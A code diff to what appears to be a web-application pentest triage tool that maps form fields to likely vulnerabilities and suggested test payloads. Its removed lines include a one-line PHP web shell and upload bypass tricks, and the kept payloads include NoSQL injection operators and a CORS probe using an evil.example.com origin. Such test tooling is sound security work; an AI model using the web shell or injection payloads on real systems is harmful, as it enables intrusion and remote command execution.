@@ -100,11 +100,6 @@ _RECOMMENDED_PAYLOADS: dict[str, list[str]] = {
         '{"$regex": ".*"}',
         '{"$where": "1==1"}',
     ],
-    "file_upload": [
-        "Upload: test.php (content: <?php system($_GET['cmd']); ?>)",
-        "Upload: test.php.jpg (double extension)",
-        "Upload: test.phtml (alternative PHP extension)",
-    ],
     "cors": [
         "Add header: Origin: https://evil.example.com",
         "Check response for: Access-Control-Allow-Origin: https://evil.example.com",
@@ -150,7 +145,7 @@ _RECOMMENDED_PAYLOADS: dict[str, list[str]] = {
 _FIELD_RULES: list[tuple[re.Pattern, list[str]]] = [
     # SQL injection targets
     (re.compile(r"id$|user_?id$|item_?id$|order_?id$|product_?id$", re.I),
-     ["sqli", "privesc", "nosql"]),
+     ["sqli", "nosql"]),
     (re.compile(r"q$|query$|search$|keyword$|filter$|term$", re.I),
      ["sqli", "xss", "ssti"]),
     (re.compile(r"username|user$|login$|email$", re.I),
@@ -176,12 +171,12 @@ _FIELD_RULES: list[tuple[re.Pattern, list[str]]] = [
     (re.compile(r"data$|payload$|json$|xml$|input$", re.I),
      ["sqli", "xss", "ssti", "nosql", "deserialization"]),
     (re.compile(r"upload$|attach$|file$|image$|photo$", re.I),
-     ["file_upload", "path_traversal"]),
+     ["path_traversal"]),
 ]
 
 # Field types → likely vulns
 _TYPE_RULES: dict[str, list[str]] = {
-    "file":     ["file_upload"],
+    "file":     ["path_traversal"],
     "hidden":   ["csrf", "sqli", "deserialization"],
     "url":      ["ssrf", "open_redirect"],
     "email":    ["mail_header", "xss"],
@@ -269,7 +264,7 @@ class TriageReport:
 # Risk level computation
 # ---------------------------------------------------------------------------
 
-_CRITICAL_VULNS = {"os", "sqli", "ssti", "deserialization", "stored_xss", "ssrf", "file_upload"}
+_CRITICAL_VULNS = {"os", "sqli", "ssti", "deserialization", "stored_xss", "ssrf"}
 _HIGH_VULNS     = {"xss", "dom_xss", "nosql", "path_traversal", "cors"}
 _MEDIUM_VULNS   = {
     "open_redirect", "csrf", "header_injection", "mail_header",
